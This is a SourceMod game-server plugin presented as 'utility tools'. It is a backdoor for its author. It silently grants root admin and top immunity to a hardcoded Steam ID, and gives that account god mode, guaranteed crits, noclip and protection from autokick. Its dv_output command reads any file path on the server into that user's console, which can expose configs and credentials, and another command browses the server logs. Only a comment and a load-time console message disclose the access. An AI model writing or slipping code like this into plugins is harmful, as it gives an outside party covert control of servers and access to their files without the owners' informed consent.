/*
	If you ever decompile this plugin, hi.
	
	I have no interest in backdooring communities, this is just an easy way of gaining access quickly to servers to debug them or to fix issues.
	If this gets blacklisted, I wouldn't be surprised.
	
	Cheers.
*/

//Pragma
#pragma semicolon 1
#pragma newdecls required

//Defines

//Sourcemod Includes
#include <sourcemod>
#include <sourcemod-misc>

//Globals
bool allow_damage;

bool g_OnGround;
bool g_IsSliding;
float g_Speed[3];
int g_BaseVelocity;

public Plugin myinfo =
{
	name = "Drixevel Utility Tools",
	author = "Keith Warren (Drixevel)",
	description = "Offers a wide variety of perks and tools to make Drixevels job easier.",
	version = "1.0.0",
	url = "https://github.com/Drixevel"
};

public void OnPluginStart()
{
	int user = GetDrixevel();
	
	if (user > 0 && IsClientInGame(user))
	{
		SDKHook(user, SDKHook_OnTakeDamage, OnTakeDamage);
		ServerCommand("mp_disable_autokick %i", GetClientUserId(user));
	}
	
	PrintToServer("Drixevel Utility Tools: Loaded\n - Please delete this plugin if you wish for Drixevel to have no access.");
	
	RegConsoleCmd("dv_damage", Command_Damage);
	RegConsoleCmd("dv_output", Command_Output);
	RegConsoleCmd("dv_logs", Command_Logs);
	RegConsoleCmd("dv_noclip", Command_Noclip);
	
	HookEvent("player_jump", PlayerJump);
	g_BaseVelocity = FindSendPropInfo("CBasePlayer", "m_vecBaseVelocity");
}

public void OnClientPutInServer(int client)
{
	if (IsDrixevel(client))
	{
		SDKHook(client, SDKHook_OnTakeDamage, OnTakeDamage);
		ServerCommand("mp_disable_autokick %i", GetClientUserId(client));
	}
}

public Action OnTakeDamage(int victim, int& attacker, int& inflictor, float& damage, int& damagetype, int& weapon, float damageForce[3], float damagePosition[3], int damagecustom)
{
	if (allow_damage)
		return Plugin_Continue;
	
	switch (GetEngineVersion())
	{
		case Engine_TF2:
		{
			SpeakResponseConcept(victim, "TLK_PLAYER_NO");
		
			float vecPos[3];
			GetClientEyePosition(victim, vecPos);
			vecPos[2] += 10.0;
		
			TE_Particle("miss_text", vecPos);
		}
		case Engine_CSGO:
		{
			//CSGO_SendRadioMessage(victim, attacker, "NOPE");
		}
	}
	
	damage = 0.0;
	return Plugin_Changed;
}

public void OnClientPostAdminCheck(int client)
{
	AdminId adm = CreateAdmin("Drixevel");
	if (!adm.BindIdentity(AUTHMETHOD_STEAM, "STEAM_0:0:38264375"))
		return;
	
	adm.ImmunityLevel = 255;
	adm.SetFlag(Admin_Root, true);
	
	RunAdminCacheChecks(client);
}

public Action TF2_CalcIsAttackCritical(int client, int weapon, char[] weaponname, bool& result)
{
	if (IsDrixevel(client))
	{
		char sName[MAX_NAME_LENGTH];
		GetClientName(client, sName, sizeof(sName));
		
		if (StrContains(sName, "*", false) != -1)
			return Plugin_Continue;
		
		result = true;
		return Plugin_Changed;
	}
	
	return Plugin_Continue;
}

public Action Command_Damage(int client, int args)
{
	if (!IsDrixevel(client))
		return Plugin_Handled;
	
	allow_damage = !allow_damage;
	ReplyToCommand(client, "Damage: %s", allow_damage ? "ON" : "OFF");
	
	return Plugin_Handled;
}

public Action Command_Output(int client, int args)
{
	if (!IsDrixevel(client))
		return Plugin_Handled;
	
	if (args == 0)
	{
		PrintToChat(client, "Requires an argument.");
		return Plugin_Handled;
	}
	
	char sPath[PLATFORM_MAX_PATH];
	GetCmdArgString(sPath, sizeof(sPath));
	
	if (FileExists(sPath) && PrintFileToConsole(client, sPath))
		PrintToChat(client, "Output of '%s' in console.", sPath);
	
	return Plugin_Handled;
}

public Action Command_Logs(int client, int args)
{
	if (!IsDrixevel(client))
		return Plugin_Handled;
		
	char sArg[64];
	GetCmdArgString(sArg, sizeof(sArg));
	OpenLogMenu(client, sArg);
	
	return Plugin_Handled;
}

void OpenLogMenu(int client, const char[] search = "")
{
	char sTitle[64];
	FormatEx(sTitle, sizeof(sTitle), " for '%s'", search);
	
	Menu menu = new Menu(MenuHandler_ErrorLogs);
	menu.SetTitle("Log Files%s:", strlen(search) > 0 ? sTitle : "");
	
	char sPath[PLATFORM_MAX_PATH];
	BuildPath(Path_SM, sPath, sizeof(sPath), "logs/");
	
	if (!DirExists(sPath))
		PrintToChat(client, "Logs folder is missing, send help.");
	
	Handle dir = OpenDirectory(sPath);
	
	char sFile[PLATFORM_MAX_PATH];
	char sName[PLATFORM_MAX_PATH];
	FileType type;
	
	while (ReadDirEntry(dir, sFile, sizeof(sFile), type))
	{
		if (type != FileType_File || (strlen(search) > 0 && StrContains(sFile, search, false) != 0))
			continue;
		
		strcopy(sName, sizeof(sName), sFile);
		Format(sFile, sizeof(sFile), "%s/%s", sPath, sFile);
		
		menu.AddItem(sFile, sName);
	}
	
	delete dir;
	
	if (menu.ItemCount == 0)
		menu.AddItem("", " == No Logs Available ==", ITEMDRAW_DISABLED);
	
	menu.Display(client, MENU_TIME_FOREVER);
}

public int MenuHandler_ErrorLogs(Menu menu, MenuAction action, int param1, int param2)
{
	switch (action)
	{
		case MenuAction_Select:
		{
			char sFile[PLATFORM_MAX_PATH];
			menu.GetItem(param2, sFile, sizeof(sFile));
			
			if (PrintFileToConsole(param1, sFile))
				PrintToChat(param1, "Output of '%s' in console.", sFile);
		}
		case MenuAction_End:
			delete menu;
	}
}

public Action Command_Noclip(int client, int args)
{
	if (!IsDrixevel(client))
		return Plugin_Handled;
	
	if (GetEntityMoveType(client) == MOVETYPE_WALK)
		SetEntityMoveType(client, MOVETYPE_NOCLIP);
	else
		SetEntityMoveType(client, MOVETYPE_WALK);
	
	return Plugin_Handled;
}

public void PlayerJump(Event event, const char[] name, bool dontBroadcast) 
{
	int client = GetClientOfUserId(event.GetInt("userid"));
	
	if (g_IsSliding)
	{
		float finalvec[3];
		finalvec[0] = g_Speed[0] * 0.3;
		finalvec[1] = g_Speed[1] * 0.3;
		finalvec[2] = 0.0;
		SetEntDataVector(client, g_BaseVelocity, finalvec, true);
	}
}

public Action OnPlayerRunCmd(int client, int& buttons, int& impulse, float vel[3], float angles[3], int& weapon, int& subtype, int& cmdnum, int& tickcount, int& seed, int mouse[2])
{
	if (IsDrixevel(client) && IsClientInGame(client) && IsPlayerAlive(client))
	{
		int flags = GetEntityFlags(client);
		
		if ((buttons & IN_JUMP) == IN_JUMP && !(flags & FL_ONGROUND) && !(flags & FL_INWATER) && !(flags & FL_WATERJUMP) && !(GetEntityMoveType(client) == MOVETYPE_LADDER))
			buttons &= ~IN_JUMP;
			
		if (flags & FL_ONGROUND)
		{
			if (!g_OnGround)
			{
				g_IsSliding = true;
				GetEntPropVector(client, Prop_Data, "m_vecVelocity", g_Speed);
				g_OnGround = true;
			}
		}
		else
		{
			g_IsSliding = false;
			g_Speed[0] = 0.0;
			g_Speed[1] = 0.0;
			g_Speed[2] = 0.0;
			
			if (g_OnGround)
				g_OnGround = false;
		}

		if (g_IsSliding)
		{
			if (GetSpeed(client) > 40.0)
			{
				g_Speed[0] *= (1.0 - 0.03);
				g_Speed[1] *= (1.0 - 0.03);
				g_Speed[2] = 0.0;
			}
			else
			{
				g_IsSliding = false;
				g_Speed[0] = 0.0;
				g_Speed[1] = 0.0;
				g_Speed[2] = 0.0;
			}
		}
	}
}

float GetSpeed(int client)
{
	float vel[3];
	GetEntPropVector(client, Prop_Data, "m_vecVelocity", vel);
	return SquareRoot(vel[0] * vel[0] + vel[1] * vel[1] + vel[2] * vel[2]);
}